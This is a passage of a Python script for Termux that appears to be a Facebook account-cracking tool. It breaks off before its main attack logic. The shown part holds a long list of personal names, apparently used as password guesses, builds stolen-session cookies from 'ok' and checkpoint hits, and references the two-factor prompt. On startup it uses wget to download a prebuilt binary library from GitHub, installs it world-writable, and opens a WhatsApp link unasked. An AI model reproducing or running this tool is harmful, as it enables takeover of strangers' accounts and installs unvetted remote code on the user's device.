import os, json, time, re, random, sys, uuid, string, platform, base64
from concurrent.futures import ThreadPoolExecutor as thread
from io import BytesIO


#-> Installing pycurl and wget manually if its not installed <-#
try:
	open("/data/data/com.termux/files/usr/bin/wget", "r")
except:
	os.system("pkg install wget")

try:
	import pycurl
except:
	arch = platform.architecture()[0]
	if arch == '32bit':
		os.system("wget https://github.com/KARANTHANI/Karan-thani.git /pycurl/raw/main/32bit/pycurl.cpython-311.so")
		os.system("mv pycurl.cpython-311.so /data/data/com.termux/files/usr/lib/python3.11/")
		os.system("chmod 777 /data/data/com.termux/files/usr/lib/python3.11/pycurl.cpython-311.so")
	elif arch == '64bit':
		os.system("wget https://github.com/KARANTHANI/Karan-thani.git /pycurl/raw/main/64bit/pycurl.cpython-311.so")
		os.system("mv pycurl.cpython-311.so /data/data/com.termux/files/usr/lib/python3.11/")
	else:
		print("Unknown Device")
		exit()

try:
	import pycurl
except:
	print("pycurl error!\nContact Author")
	exit()

try:
	import requests
except:
	os.system("pip install requests")

try:
	from fake_email import Email
except:
	os.system("pip install fake_email")

import requests
from fake_email import Email

#-> Globals <-#
cp = 0
ok = 0
ok1 = 0
loop = 0
oks = []
cps = []
pcp = []
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
m = ['Aijaz|Ali', 'Zulfiqar|Ali', 'Kamran|Wassan', 'Shoaib|Shoaib', 'Muhbbat|Wassan', 'Rana|Waseem', 'Paras|Paras', 'Rana|Mohsin', 'Aliali|Aliali', 'Ali|Ali', 'Ghulam|Ghulam', 'Waqar|Lakho', 'Junaid|Chandia', 'Asif|Jan', 'Ali|Gulam', 'Malik|Saab', 'Rana|Zakir', 'Zameer|Ali', 'Irshad|Jan', 'Gulam|Shabir', 'Tariq|Rajput', 'Sajid|Ali', 'Shamshad|Ali', 'Mola|Bux', 'Awais|Rao', 'Shahbaz|Ali', 'Rana|Sahil', 'Khadam|Faqir', 'Mukhtiar|Magsi', 'Ghulam|Ali', 'Shah|Mohammed', 'Rawal|Ali', 'ستار|دادا', 'Abdul|Majeed', 'Mer|Muhammad', 'Ali|Rajput', 'Rana|Farman', 'Ahtisham|Rajput', 'Alideno|Khoso', 'Own|Rana', 'Suhail|Ahmed', 'Gulzar|Ahmed', 'Ahamd|Jam', 'Tasawar|Rajput', 'Fida|Qureshi', 'Shamshad|Rahu', 'سوشل|ميڍيا', 'Sheeraz|Abbasi', 'Bashir|Ustad', 'Zubair|Rao', 'Zafar|Ali', 'Yaqoob|Ali', 'M|Soomar', 'Altaf|Hussain', 'Bahadur|Ali', 'Farman|Ali', 'Waris|Ali', 'Rana|Qurban', 'Muhammad|Khan', 'Asad|Asad', 'Sartaaj|Sartaaj', 'Rana|Kabir', 'Rana|Abdul', 'Ghulam|Hussain', 'Kirshan|Kumar', 'Adil|Rajpoot', 'Sahoowal|Sahoowal', 'عبد|الجبار', 'Imran|Ali', 'Faz|Mahammad', 'Safeel|Nawaz', 'ريا|ض', 'Haroon|Rana', 'Amjad|Ali', 'Kashii|Rajpoot', 'Junejo|Sahib', 'Altaf|Pahore', 'Ali|Rajput', 'Zeeshan|Ali', 'Muhammad|Muktiar', 'Iftikhar|Ahmand', 'Shahzeb|Ali', 'Faiz|Jutt', 'Chanesar|Khan', 'Ali|Shar', 'Zuhair|Ahmed', 'محب|علی', 'Siraj|Khaskheli', 'Rana|Dilshad', 'Ghazanfar|Ali', 'Rao|Awais', 'Jaan|Jaan', 'Syed|Junaid', 'Abdul|Ghaffar', 'Kirshan|Kumar', 'ابومحمد|احمد', 'Nisar|Hussain', 'Nasir|Dahri', 'Hakim|Khan', 'Ahsan|Raza', 'Nadir|Rind', 'Sålmàñ|Çh', 'GhulamNabi|Khaskhali', 'Umar|Lal', 'NabeelHy|Ka', 'Dilshad|Magsi', 'Haaji|Anwar', 'Nisar|Ahmed', 'Barkat|Ali', 'Irfan|Ali', 'Aslam|Khan', 'Hashim|Khoso', 'Abdul|Malik', 'Masroor|Zardari', 'Rao|Bilal', 'Nisarkhoso|Nisarkhoso', 'مرجع|الناطق', 'Sajawal|Rajput', 'Rana|Muhammad', 'Rana|Dilshad', 'Rana|Imran', 'Daniyal|Kazmi', 'Faqeer|Baboo', 'Azan|Jan', 'Gul|Hassan', 'Nadir|Jan', 'NadeemRind|Rind', 'Angel|Rodriguez', 'Allahbux|Rang', 'Ghullam|Muhammad', 'Talib|Hussain', 'Abid|Ali', 'Rana|Noushad', 'Ghulam|Hussain', 'Samir|Samir', 'Shahid|Rana', 'Janib|Janib', 'Maria|Albuquerque', 'Rana|Qasim', 'Faizan|Ali', 'Ali|Gul', 'Madeji|Power', 'Rajput|Faisal', 'Mansoor|Sahito', 'Ali|Dero', 'Razaq|Khaskheli', 'Muneer|Ali', 'Imran|Ali', 'Sakhawat|Ali', 'Khadim|Baloch', 'Rana|Taswar', 'Raouf|Chadhar', 'Umar|Shahzad', 'Shah|Mir', 'Irfsn|Irfsn', 'Abbas|King', 'Aftab|Ali', 'M|Raju', 'Ghulam|Mustafa', 'Gul|Sher', 'Nazim|Hussain', 'Malik|Jawed', 'Deedar|Hussain', 'Maham|Khan', 'Junaid|Rajput', 'Sawan|Ali', 'Sajwal|Rao', 'Ayaz|Ali', 'Irfan|Irfan', 'Hut|Khan', 'Ana|Mendez', 'Shakeel|Khosa', 'Javed|Javed', 'Dil|E', 'Rana|Adil', 'Rahil|Ali', 'Innayat|Ali', 'Aijaz|Abbasi', 'Jamil|Jan', 'Fidah|Khoso', 'Rana|Abdul', 'Rana|Junaid', 'Malik|Sajid', 'Ghulam|Ali', 'Ahsan|Ali', 'Imtiaz|Ali', 'Islam|Baloch', 'Hashim|Khoso', 'Sattar|Buledi', 'Nanik|Ram', 'Gul|Wali', 'Rahman|Khan', 'Ali|Hassan', 'Sooraj|Kumar', 'GhulamAbbas|Channa', 'Muhammad|Saleh', 'Ali|Ali', 'Ayazaliayaz|Ayazaliayaz', 'Asif|Baloch', 'Mujeeb|Bds', 'Rana|Mustak', 'Ali|Rind', 'Amjad|Ali', 'سلامدين|سلامدين', 'Himat|Ali', 'Amanullah|Abro', 'Shookat|Ali', 'Mushoque|Malokhani', 'Zulifqar|Ali', 'Fareed|Abro', 'Zuhaib|Ali', 'Rasmyh|Rasmyh', 'Zubair|Ali', 'Waheed|Ali', 'Mohsin|Shaikh', 'Muzamil|Rajput', 'Gul|Bahar', 'Zaffar|Khoso', 'Akram|Ali', 'Rana|Sajids', 'Noor|Highlights', 'Basher|Baloch', 'Musam|Aill', 'Jamshed|Rana', 'علی|مولا', 'Hero|G', 'Rematullha|Rajpoot', 'Ustad|Hanif', 'Zubair|Ali', 'Rana|Abdul', 'Kamran|Ali', 'Kosar|Vighamal', 'Mansoor|Ali', 'Nadeem|Raza', 'Niaz|Hussan', 'Awais|Malik', 'Ammar|Shoz', 'Atta|Mohmad', 'Naeem|Khan', 'Sanju|Bhai', 'Waseem|Abass', 'Ghulam|M', 'Muhammad|Urs', 'Zahid|Hussain', 'Rana|Rajput', 'Meer|Jan', 'Waris|Ali', 'Inayat|Np', 'Sher|Muhhammd', 'Rana|Muzfar', 'Beni|Solis', 'Suba|Ali', 'Umesh|Kumar', 'Basit|Kahout', 'Rafiq|Khaskali', 'Saira|Khan', 'Rizwan|Ali', 'Shahbaz|Ali', 'Ail|Aagsr', 'M|Rafiq', 'Alom|Alahaj', 'Muhmmad|Waris', 'Sameer|Ali', 'Rana|Qaser', 'Fkgkodfj|Xkxnxuc', 'Saijad|Ali', 'Nadeem|Jan', 'Ajkhoso|Ajkhoso', 'Huzaifa|Ansari', 'Mazhar|Abbas', 'Molaa|Bux', 'Mashuq|Ali', 'Aneel|Kumar', 'Zahid|Hussain', 'Alihyder|Kalhoro', 'Rana|Rana', 'Bashir|Ahmed', 'Khalid|Hussein', 'Mumtaz|Ali', 'Arif|Memon', 'Ayoub|Baloch', 'Tehmoor|Ali', 'Imran|Ali', 'Shamshad|Ali', 'Ghulam|Hussain', 'Sajjad|Panhwar', 'Mole|Deno', 'Farooq|Bhaijan', 'Israr|Jakhrani', 'Imtyaz|Ali', 'Adeel|Masih', 'Gull|Hassan', 'Tando|Adam', 'منظور|راهو', 'Rana|Rehman', 'Mamtaz|Sehto', 'Amjid|Ali', 'Rana|Mubashir', 'Hamidullah|Mangsi', 'Ghulam|Nabi', 'Ahmed|Ali', 'Syedjaved|Shah', 'Rao|Hassan', 'Papoo|Kumar', 'Mehtab|Ali', 'Rana|Kashif', 'Rana|Wnus', 'Farman|Ali', 'Zulifiqar|Zulifqar', 'Sadam|Chandio', 'Mitho|Mallah', 'کاشف|راجپوت', 'Shamshaad|Rahoo', 'Hajan|Abbasi', 'Muneer|Zaib', 'Ayaz|Ayaz', 'Zain|Ali', 'Ghulam|Muhammad', 'Rao|Bilal', 'Babu|Khan', 'Rana|Ikram', 'Rana|Nasir', 'Amen|Rajpot', 'Fardeen|Panhwar', 'نگاھ|حبيب', 'Nadeem|Ali', 'Najaf|Ali', 'عمران|عباسی', 'Sahil|Shah', 'Ali|Hassan', 'Sonu|Jani', 'Ajmal|Abbasi', 'Abn|Rajab', 'Imtiyaz|Yousufzai', 'Dildar|Ali', 'Adil|Rao', 'Badshah|Yt', 'Sawan|Ali', 'Ali|Ahmed', 'Amir|Ali', 'Amjad|Ali', 'Shahid|Khan', 'Siama|Khan', 'Gulam|Shabir', 'Tehmoor|Hassan', 'Ghulam|Ali', 'Masum|Ali', 'Dedar|Ali', 'Shani|Jutt', 'Rintu|Kumar', 'Sikandar|Shah', 'Furqan|Jutt', 'Rahil|Ali', 'Rana|Shehzad', 'Nisha|Kumari', 'Jamshed|Khan', 'Zawar|Safdar', 'Murtaza|Ali', 'Muhammad|Aijaz', 'Punhal|Ali', 'Bisharat|Mirbahar', 'Xtylíśh|Shahmir', 'نصيراحمد|ميمڻ', 'Darya|Khan', 'Imdad|Khoso', 'Allyas|Allyas', 'Amjad|Ali', 'Bhatti|G', 'Faizan|Aziz', 'Rashad|Baloch', 'Abdul|Jabar', 'Rana|Shafiq', 'Hamadullah|Lakho', 'Ziafat|Khan', 'Faqeer|N', 'Rana|Ibrar', 'Shafi|Muhmmad', 'Awees|Ali', 'Amir|Ali', 'Ali|Khan', 'QaMar|ZaMan', 'Rana|Naveed', 'فرینا|فرینا', 'Ghul|Sher', 'Safeer|Khaskhali', 'Rana|Asim', 'Farhan|Ali', 'Ghulam|Abbas', 'Zulfiqar|Ali', 'Zakir|Ali', 'Rhman|Ali', 'Rana|Ali', 'Muneer|Khan', 'Mumtaz|Ali', 'Nadeem|Ali', 'Zameer|Shah', 'Faheem|Ahmad', 'Pordip|Mandal', 'Shahzaib|Rahman', 'Zidi|Bacha', 'Waqar|Rajput', 'Ali|Akbar', 'Ali|Raza', 'Sabir|Ali', 'Rana|Qurban', 'Ali|Bahte', 'Sajad|Ali', 'Ahadattaullah|Malik', 'Muzammil|Hussain', 'Jan|Muhammad', 'Fasial|S', 'Ameer|NaNa', 'Makro|Sharif', 'Mithal|Khaskheli', 'محمدموسا|محمدموسا', 'Mitho|Mallah', 'Muzzamil|Ali', 'Ahmad|Hassan', 'Babar|Babar', 'Zawar|Muhammad', 'Rana|Nadir', 'Mazhar|Ali', 'Rana|Irfan', 'Bilal|Abbasi', 'Ghulam|Jaffar', 'Asif|Rana', 'Mœhäməd|Řhæ', 'M|Nawaz', 'Farooq|Ali', 'Ashfaq|Rahoo', 'Azmat|Ali', 'Mateen|Rana', 'Shan|Ali', 'Çhårîyē|Çhøkrī', 'Parwez|Ali', 'Azhar|Hussain', 'Shahabaz|Ali', 'Syed|Ghot', 'Zahid|Hussain', 'Mir|Babu', 'Zarik|M', 'Shakel|Ansari', 'Hafiz|Imran', 'Shah|Zaib', 'Bilal|Jan', 'Asif|Asif', 'Asif|Asif', 'Muzafar|Rajbut', 'Makhdoom|Ghulam', 'Rana|Farooq', 'Gulam|Yaseen', 'Ashiqe|Jatt', 'Arshad|Brohi', 'Nazeer|Ahmed', 'Sajad|Ali', 'Mircho|Mal', 'Rana|Junaid', 'Lakho|Mal', 'Sajid|Ali', 'Raees|Rahat', 'Irfan|Ali', 'Rana|Imran', 'Ali|Mughal', 'Riaz|Khan', 'Ahsan|Bozdar', 'Shahidalisolangi|Shahidalisolangi', 'Tariq|Tariq', 'Rao|Nasir', 'Zahid|Ali', 'Shahzad|Madni', 'Sarfaraz|Rahu', 'Mubashair|Rana', 'Ahsan|Khoso', 'Jalger|Bhatti', 'Rana|Wajid', 'Lala|Aziz', 'Shakir|Abbasi', 'Ali|Asgar', 'Ruble|Hasan', 'Abdul|Rehman', 'Azizullah|Soomro', 'Abbas|Ali', 'Muhammad|Ali', 'Rana|Wajid', 'Rana|Musharaf', 'Rashid|Qureshi', 'Shahmeer|Chandio', 'Shan|Ali', 'Ahmed|Qureshi', 'Zaheer|Abbas', 'Imran|Ali', 'Asif|Khan', 'Shahid|Ali', 'Mangii|Mangii', 'Momin|Ali', 'Meer|Shan', 'Muqu|Poiro', 'Umar|Shahzad', 'Waris|Ali', 'Numwar|Ali', 'Muhammad|Tahir', 'AKhtar|Ali', 'Rana|Sajid', 'Sarfarazmemon|Attad', 'Salim|Junejo', 'Mashque|Ali', 'Hassnan|Ali', 'Irfan|Ali', 'Adv|Ali', 'Himmat|Ali', 'Khalid|Jamil', 'Mohsin|Rajput', 'Syed|Nadir', 'Raheem|Punho', 'Rana|Abdullah', 'Rana|Noaman', 'Mansoor|Solangi', 'Imran|Jaan', 'Waris|Ali', 'Rana|Mubasher', 'Mujahid|Ali', 'Hussnain|Rajpoot', 'Chaudhary|Abdul', 'Haider|Baloch', 'Ali|Dino', 'Mir|Khan', 'Irfan|Fatima', 'Arshad|Baloch', 'Shakir|Abbasi', 'Naveed|Rind', 'Gul|Muhammad', 'Meer|Murtaza', 'Papo|Papo', 'Nisar|Ali', 'Gbhs|Bhit', 'Sadoro|Jan', 'Rana|Moon', 'Ramzan|Jan', 'Rana|Zakir', 'Rao|Waqas', 'M|Waqas', 'Rana|Rana', 'Rukhsar|Haidry', 'RaNa|BOby', 'M|Juman', 'Sadiq|Ali', 'Manik|Khan', 'Ran|A', 'Ghulab|Hussain', 'Ronaq|Ali', 'Tarique|Ali', 'Abdul|Qadir', 'Zawar|Sohana', 'Mehran|Rajput', 'Sikandar|Ali', 'Ãtîf|Â', 'Meer|Shahzeb', 'Sajjad|Abbasi', 'Rana|Naeem', 'Bashir|Ahmed', 'Rafeh|Rajpoot', 'ẞk|KhÄñ', 'Imtiaz|Khoso', 'Alex|Shahzad', 'Aman|Abbasi', 'Mehran|Rajput', 'Raja|Rajpot', 'Bahdur|Ali', 'Hammad|Ali', 'Salman|Salman', 'Shahzad|Shahzad', 'AtaullAh|Khan', 'Rafique|Mirani', 'Arbab|Ali', 'Nisar|Ali', 'Zahid|Hussain', 'Rana|Shahzad', 'Rana|Ramzan', 'Noro|Mohmad', 'Riaz|Rajput', 'Mahbat|Khan', 'Ahsan|Ali', 'Rana|Ikram', 'Qamar|Abbas', 'Jahanzib|Ali', 'Rana|Sunny', 'Rao|Yasir', 'Muhammad|Mithal', 'Ashiq|Hussain', 'Ha|Ni', 'Abdul|Latif', 'Meer|Mortaz', 'Meer|Zohaib', 'Zahid|Bhatti', 'Awais|Rajput', 'Ali|Bux', 'Abdul|Hakeem', 'Hassnain|Muavia', 'Syed|Junaid', 'Riaz|Machi', 'Ahsan|Abro', 'Hyder|Ali', 'Sattar|Sattar', 'Sayed|Sharafat', 'Syed|Bilalarif', 'Lal|Muhmmad', 'Mohsin|Ali', 'Asif|Ali', 'Juleed|Shah', 'Hayat|Khan', 'Ali|Bux', 'पवन|अल्लापुर', 'Ghulam|Nabi', 'Zaheer|Ali', 'Soomar|Bughio', 'Madad|Ali', 'Naeem|Chohan', 'Javed|Javed', 'Waseem|Raza', 'Saorg|Khan', 'Zeeshan|Zeeshan', 'Aliza|Chaudhary', 'Rana|Shuaib', 'Ali|Khan', 'Rao|Shabbir', 'Commandos|King', 'Arshad|Sli', 'Rana|Shahrukh', 'Ratan|Kumar', 'Umar|Khan', 'Ali|Bhnoo', 'Shahzaib|Shah', 'Aqib|Gakhar', 'Rana|Ishaq', 'Bilal|Rajput', 'Asif|Khan', 'Hazrat|Hussain', 'Zohair|Ali', 'Parvez|Ali', 'Altaf|Hussain', 'Mashooq|Ali', 'Dilshad|Magsi', 'Gulam|Mustafa', 'Safdiar|Khan', 'Tofiq|Khan', 'Sudheer|Ahmad', 'Suhrab|Pardesi', 'Syed|Badshah', 'Ashok|Kumar', 'Ssbri|Chandio', 'Yaseen|Ali', 'Rimsha|Shehzadi', 'Meer|Aamir', 'Lakhiar|Adeel', 'Ariz|Muhammad', 'عبداللہ|کوھارو', 'Yameen|Ali', 'Sahil|Gadehi', 'Sahab|Ali', 'Naimatullah|Ali', 'Baqir|Sajjad', 'مير|حارث', 'M|Slutan', 'Sadaqat|Ali', 'Fahad|Ali', 'Muhammed|Shabeer', 'Khalifo|Chandio', 'Zohaib|Ali', 'Ab|Ghani', 'Ibrahim|Baloch', 'Rehmatullah|Mastoi', 'Mohammed|Younis', 'Shahzadi|Kiran', 'Ahmad|Khan', 'Arshad|SooMro', 'Sadam|Solangi', 'Yamen|Ali', 'Majid|Khan', 'Ab|Aziz', 'Sabir|Khuharo', 'Nazeer|Chandio', 'Md|Samer', 'Kaif|Qureshi', 'MuHammad|HaaDi', 'Altaf|Khan', 'Majid|Ali', 'Muhammad|Abraim', 'Noor|Ahmed', 'Abid|Hussain', 'Ashraf|Buriro', 'Rajib|Ali', 'Ahsan|Ali', 'Aakash|Khuharo', 'Hassan|Ali', 'Awaiz|Memon', 'Asharf|Malah', 'Muslim|Chandio', 'Haji|Saddam', 'Rashid|Ali', 'Assadullah|Kolachi', 'Kashif|Ali', 'Irfan|Ali', 'Zulfqar|Soomro', 'Ghafar|Chandio', 'Younis|Ali', 'Meer|Murtiza', 'Majahd|Ali', 'Rao|Arslan', 'Rana|Tsawar', 'Akbar|Rajput', 'Rana|Yasir', 'Rana|Waqar', 'Rana|Umer', 'Rao|Zeeshan', 'Rana|Aqib', 'Rana|Mudassar', 'Rana|Zubair', 'Rana|Zohaib', 'Rana|Rana', 'Rao|Shoaib', 'Nokhaiz|Rao', 'Rana|G', 'Saeed|Somro', 'Rana|Muklish', 'Muzamil|Rajput', 'Râõ|Zêshãñ', 'Rana|Nasrullah', 'Rana|Naveed', 'Hamza|Rajpoot', 'Rana|Naveed', 'Rana|Zahid', 'Rao|Ali', 'Rao|Ishfaq', 'Ehsan|Rana', 'Ahsan|Rana', 'Mohammed|Akmal', 'Rana|Naeem', 'Rana|Ahmad', 'Rana|Shani', 'Rao|Nasir', 'Rao|M', 'Rana|Imran', 'Rao|Arshad', 'Rao|Sanaullah', 'Ali|Rana', 'Rao|Muhammad', 'Rana|Gulraiz', 'Salal|Rajput', 'Rana|Muhammad', 'Ijaz|Rajpoot', 'M|Farman', 'Rao|Raees', 'Rana|Umar', 'Umair|Rana', 'Shafiq|Rajpoot', 'Rana|Numan', 'Rao|Shb', 'Rana|Yousif', 'Rana|Liaqat', 'Rana|Asad', 'Zafar|Rajpoot', 'Rao|Hamza', 'Abubakar|Rajput', 'Rao|M', 'Rana|Ishaq', 'Waqas|Rajpoot', 'Amir|Sohail', 'Rao|Sohaib', 'Rana|Shazil', 'Rao|Bilal', 'Rao|Altaf', 'Rao|Nabeel', 'Hamza|Rao', 'Asif|Rana', 'Rana|Umair', 'Raokashif|Ali', 'Rao|Qaiser', 'Rana|Attual', 'Rana|Shabaz', 'Rao|Salman', 'Rao|Samad', 'Rao|Shoaib', 'Rana|A', 'Rao|Kashif', 'Rao|Zarar', 'Rana|Tayyub', 'Raja|Kamal', 'Amir|Rajput', 'RaoAlizaman|RaoAlizaman', 'Hamza|Rao', 'Rana|Falak', 'Sikandar|Khan', 'Rao|Shahbaz', 'Rana|Talha', 'Kashif|Rajpoot', 'Hammad|Rana', 'Hamza|Rao', 'Roa|Zahid', 'Rana|Hamza', 'Rao|Saleem', 'Rao|Faryad', 'Rao|Abubakar', 'Bilal|Rajput', 'Rao|Waseem', 'Sonu|Rao', 'Rana|Rizwan', 'Bilal|Rao', 'Rans|Maqsood', 'Rana|Furqan', 'Rao|Ali', 'Rana|Muzamil', 'M|Asif', 'Rao|Sohail', 'Rana|Bahadur', 'Rana|Muhmmad', 'Shahzada|Gs', 'Rao|Farhan', 'Zahgim|Ali', 'Abaid|Raja', 'Rana|Waseem', 'Rana|Ajmal', 'Rao|Latif', 'Rao|Aqib', 'Rana|Ramzan', 'Wajid|Rana', 'Sabir|Rajpoot', 'Rana|Shehryar', 'Rana|Yaqub', 'Rao|Abdul', 'Rajput|Sab', 'Rana|Tasawar', 'Rana|Waseem', 'Rana|Babar', 'Rana|Shahid', 'Rana|Maviya', 'Rana|Saeed', 'Waheed|Rajput', 'Junaid|Rajpoot', 'Rao|Saqib', 'Rao|Azeem', 'Rana|Ali', 'Muhammad|Nadeem', 'Rana|Majid', 'Rana|Sahab', 'Abubakar|Jatoi', 'Sabir|Dogar', 'Ameen|Rana', 'Rana|Shakeel', 'Rao|Tasleem', 'Pʀɩŋcɘ|Nʌsɩʀ', 'Rana|Mani', 'Rana|Jee', 'Zidi|Rana', 'Rana|Kamran', 'Rana|Zabi', 'Mehtab|Rao', 'حسن|راو', 'Rana|Sajid', 'Rao|Aftab', 'Rana|Muhammad', 'Muhammad|Muhammad', 'Rao|Abdulrazaq', 'Rao|MubeenRao', 'Rao|Nazeer', 'Rana|Adnan', 'Rana|Alishan', 'Rana|Wahab', 'Rao|Ali', 'Rana|Rashid', 'Rana|Waqar', 'Dilawar|Rao', 'Rana|Iftkhar', 'Shami|Rana', 'Rana|Hamza', 'Rana|Luqman', 'Rao|Haseeb', 'Rana|Waseem', 'Rana|Abid', 'شہری|راجپوت', 'Rao|Mohammad', 'Rana|Rashid', 'Rana|Hamza', 'Tariq|Javid', 'Rao|Ahtsham', 'Rana|Tauqeer', 'Rao|Zeeshan', 'Ahad|Rajpoot', 'M|Muzamil', 'Rana|Zaid', 'Rana|Asad', 'Usama|Rana', 'Rana|Ali', 'Rana|Sajid', 'Rana|Tokeer', 'Rana|Mikro', 'Rana|Rana', 'Raza|Jafri', 'Rana|Kamran', 'Rao|Sharafat', 'Rana|Awais', 'Rana|Arslan', 'Rana|Qazafi', 'Rana|Waqar', 'Flk|Sher', 'Rana|Danish', 'Rana|Mudassar', 'Rana|Khalid', 'Rana|Nadeem', 'Adil|Rao', 'Rana|Tahseen', 'Rao|Tayyab', 'Rao|Waseem', 'Rana|Faheem', 'Rao|Khaleeq', 'Ali|Adnan', 'Rao|Ikhtiar', 'Rao|Jani', 'Rao|Amir', 'Farman|Rao', 'اشتہاری۔راجپوت|اشتھری۔راجپوت', 'RanaAli|Rana', 'Rao|Shoaib', 'Raozain|Raozain', 'Sajawal|Rajpoot', 'Rana|Tanveer', 'Rao|Aqib', 'Rana|Ehsan', 'Rao|Zubair', 'Rajpoot|Zeeshan', 'Ahsan|Rana', 'Rao|Saad', 'Safdar|Rana', 'Rana|Mubeen', 'Räñâ|Umäir', 'Rao|Jani', 'Rana|Ibrar', 'Rao|Amir', 'Rana|Asif', 'Hussnain|Qureshi', 'Abdullah|Somroo', 'Rana|Nabeel', 'Rana|Gulfam', 'Babar|Rao', 'Zubair|Rao', 'Abubakar|Rao', 'Rana|G', 'Rana|Shair', 'Rana|Haris', 'Rao|Tariq', 'Zain|Rao', 'Muhammad|Qadeer', 'Rao|Naveed', 'Rizwan|Rao', 'Sajid|Ali', 'Rao|Munir', 'Rana|Afaq', 'Rajput|Brand', 'Rao|Hassan', 'Rana|Saim', 'Mukhtiyar|Khan', 'Rana|Sarfraz', 'Rana|Naveed', 'Rana|Faizan', 'Usama|Rana', 'Muzammil|Rao', 'Rahman|Dogar', 'Rana|Danish', 'Rao|Shahryar', 'Rana|Shahzad', 'Naqeeb|Rao', 'Anss|Rana', 'Subhan|Rana', 'عبدالرحمان|راؤ', 'R|A', 'Ch|Asad', 'Nadeem|Rao', 'Raja|Nawaz', 'Rana|Iqbal', 'S|Rao', 'Rana|Maqsood', 'Rao|Qasim', 'Rana|Zahid', 'راؤ|عرفان', 'M|Jamshed', 'Rao|Imran', 'Shahzad|Rajpoot', 'Rana|Shahzaib', 'Muhammad|Sikandar', 'راناعامر|راناعامر', 'Rao|Hasnain', 'Rana|Asif', 'Javed|Rana', 'Raoiqrar|Raoiqrar', 'Zaheer|Rana', 'Mudassir|Rajput', 'Rana|Awais', 'Rao|Waseem', 'Ali|Rao', 'Rao|Asif', 'Haseeb|Rajput', 'Rana|Rizwan', 'Rana|Shuaib', 'Rana|Shoaib', 'Rao|Shoaib', 'Rajpoot|Arslan', 'Rao|Muzammil', 'Rana|Rashid', 'Rana|Shahbaz', 'Rao|Inaam', 'رانا|ندیم', 'Arslan|Rao', 'Rana|Shakeel', 'Zeeshan|Rana', 'Rana|Mansoor', 'رانا|عاطف', 'Bilal|Prince', 'Rana|Shokat', 'Rana|Babar', 'M|Jafar', 'Ranaiqrar|Ranaiqrar', 'Rao|Imran', 'Rao|Arif', 'Fatima|Rajpoot', 'Nomii|Rajput', 'Rao|Junaid', 'Hasnaat|Rajput', 'Rao|Haleem', 'عبداللہ|راجپوت', 'Shoiab|Rana', 'رانا|دانی', 'Rao|Tasawar', 'Sunny|Rao', 'ᎷᎥᏗᏁ|ᏕᏬᏝᏖᏗᏁ', 'Sajjad|Rao', 'Sardar|Ijaz', 'Rao|Akbar', 'Rana|Usama', 'Mujahid|Khanbadani', 'Rao|Amjid', 'Rana|Ahsan', 'Rana|Akram', 'Adnan|Rana', 'Imran|Ashraf', 'Rajab|Rajput', 'Rao|Shakir', 'Rana|Usman', 'رانا|ارسلان', 'رضا|سعید', 'Rao|Tariq', 'Saad|Rajpoot', 'Parvaiz|Parvaiz', 'Rana|Dilo', 'Rana|Rashid', 'Rana|Asif', 'Rao|Ali', 'Sultan|Rao', 'Rana|Umair', 'Rao|Saad', 'Rao|Farhan', 'Rana|Babar', 'Raja|Sahib', 'Umer|Wakeel', 'Rao|M', 'Arslan|Rao', 'Rao|Mudassar', 'Rajpoot|Ramzanrajpoot', 'Wasim|Rao', 'Bilal|Rana', 'Shahbaz|Rajpoot', 'M|Asif', 'Rana|Aftab', 'Usama|Rao', 'Rao|Abdul', 'Amir|Sohail', 'Rafiq|Khan', 'Rao|Tanveer', 'Rana|Fahim', 'Rana|Afaq', 'Rana|Jabbar', 'Rana|Zain', 'Rao|Talha', 'Ahmad|Raza', 'M|Rao', 'Brand|Rao', 'Rao|Waseem', 'Rana|Zeshan', 'Adeel|Khalil', 'Rana|Ahamd', 'Rana|Sajid', 'Rana|Bilal', 'Rao|Amir', 'Rao|Asif', 'Farhad|Rao', 'Rao|Kashif', 'Ibrar|Rajput', 'Rao|Aftab', 'Muhammad|Ali', 'Rao|Ali', 'Hassan|Rajput', 'Rao|Mazhar', 'Rao|F', 'Sijawal|Rana', 'Rana|Intizar', 'Rana|Husnain', 'Rao|Babar', 'Rana|Uzair', 'عثمان|احمد', 'Rana|Ali', 'Rana|Waseem', 'Rana|Rehan', 'Rana|Ahmad', 'Rao|Touqeer', 'Rana|Shahid', 'Rao|Abid', 'Azeem|Rao', 'Rana|Imran', 'Rana|Asgher', 'Rao|Raza', 'Rana|Hussain', 'Rao|Shahryar', 'Rao|G', 'Nouman|Rajpoot', 'Rao|Faisal', 'Rao|Saim', 'Rana|Shahid', 'Rana|Adnan', 'Usman|Usman', 'Rajpoot|Putter', 'Hafiz|Ahtsham', 'Rana|Nadeem', 'Moon|Rao', 'Shana|Rao', 'Rao|Fakhar', 'Rana|Imran', 'Rajpoot|Sufyan', 'Malik|Fiaz']

#-> Colors <-#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
BLUE = '\033[1;34m'
EXTRA ='\x1b[38;5;208m'

#-> Get "=" according to screen size (by Farhan Ali) <-#
def eqs():
	return "="*os.get_terminal_size()[0]

#-> Logo <-#
logo = f"""{WHITE}
  _  __          _____            _   _ 
 | |/ /    /\   |  __ \     /\   | \ | |
 | ' /    /  \  | |__) |   /  \  |  \| |
 |  <    / /\ \ |  _  /   / /\ \ | . ` |
 | . \  / ____ \| | \ \  / ____ \| |\  |
 |_|\_\/_/    \_\_|  \_\/_/    \_\_| \_|
                                        
                                        

\t[×]Developed By KARAN THANI
{WHITE}[•] AUTHOR       : KARAN THANI
{WHITE}[•] STYLE        : HAR HAR MAHADEV
{WHITE}[•] WhatsApp     : +9762434145
[•] Facebook     :KARAN THANI
[•] Version      : {RED}1
{WHITE}[•] YouTube      : KARAN THANI

{WHITE}{eqs()}
\33[37;41m\tWelcome x To x KARAN THANI
{WHITE}{eqs()}"""

#-> Open WhatsApp <-#
os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')

#-> Functions <-#
def cvt(st,ran):
	try:
		if st == 'ok':
			cookie = ('c_user=%s;xs=%s;fr=%s;datr=%s;'%(ran['c_user'],ran['xs'],ran['fr'],ran['datr']))
		elif st == 'cp':
			cookie = ('checkpoint=%s;datr=%s;fr=%s;'%(ran['checkpoint'],ran['datr'],ran['fr']))
	except:
		cookie = '; '.join([str(x)+"="+str(y) for x,y in ran])
	
	return cookie

def dec(t):
	return base64.b64decode(t).decode()

rnd = random.randint

def find(txtt,wrd):
	return re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]

def linex():
	print('\033[1;37m'+("-"*os.get_terminal_size()[0]))

def clear():
	os.system('clear')
	print(logo)

def cleanUid(text):
